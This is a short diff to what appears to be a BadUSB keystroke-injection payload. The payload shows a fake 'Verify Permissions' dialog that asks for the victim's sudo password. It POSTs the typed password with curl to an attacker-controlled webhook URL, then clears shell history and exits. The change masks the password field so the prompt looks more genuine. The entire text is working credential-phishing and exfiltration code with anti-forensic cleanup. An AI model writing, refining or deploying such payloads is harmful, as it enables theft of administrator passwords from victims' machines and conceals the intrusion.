@@ -28,4 +28,4 @@ STRING WEBHOOK
 STRING "
 
 REM All-in-one is important 
-STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Verify Permissions" --inputbox "Put your sudo password di continue" --default "password")\"}" $WEBHOOK_URL); history -c; exit;
+STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(kdialog --title "Verify Permissions" --password "Put your sudo password di continue" --default "password")\"}" $WEBHOOK_URL); history -c; exit;
